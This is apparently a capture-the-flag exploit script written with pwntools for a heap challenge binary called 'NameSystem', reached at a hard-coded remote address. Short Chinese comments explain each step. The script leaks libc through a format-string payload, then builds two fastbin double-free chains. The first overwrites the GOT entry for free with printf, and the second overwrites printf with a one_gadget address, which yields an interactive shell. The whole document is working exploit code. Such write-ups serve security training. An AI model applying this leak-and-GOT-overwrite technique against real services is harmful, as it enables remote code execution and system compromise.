from pwn import *
import sys, os
context.log_level = 'debug'
prog = './NameSystem'
elf = ELF(prog)
#p = process(prog)
libc = ELF("./libc-2.23.so")
p = remote("183.129.189.62", 21705)
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, name):
	p.sendlineafter("Your choice :\n", '1')
	p.sendlineafter("Name Size:", str(size))
	p.sendlineafter("Name:", name)

def free(idx):
	p.sendlineafter("Your choice :\n", '3')
	p.sendlineafter("The id you want to delete:", str(idx))
def exp():
	add(0x60, '%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')		#格式化字符串 泄露libc
	add(0x60, '/bin/sh\x00')
	for i in range(8):
		add(0x60, '%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')
	for i in range(5):
		add(0x30, 'a')
	for i in range(5):
		add(0x50, 'a')	
	free(18)
	free(19)
	free(16)
	free(17)
	free(9)
	add(0x50, p64(0x601ffa))		#第一条double free链，用于将got['free']修改为plt['printf']来泄露libc
	for i in range(3):
		add(0x30, 'a')
	free(18)
	free(19)
	free(17)
	free(17)
	add(0x30, p64(0x602022))		#提前设置好第二条double free链，因为泄露完libc free将无法使用，第二次double free用来将got['printf']改为system或one_gadget
	for i in range(4):
		free(0)
	add(0x30, 'a')
	add(0x30, 'a')
	add(0x50, 'a')
	add(0x50, 'a')
	add(0x50, '\x00'*(6)+p64(0)+'\xd0\x06\x40\x00\x00')
	free(0)
	libc_base = int(p.recvuntil("Done!", drop = True)[-12:], 16)-0x20830
	success(hex(libc_base))
	system = libc_base + libc.sym['system']
	one = libc_base + 0x45216
	success(hex(system))
	add(0x30, 'a'*6+p64(one))
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
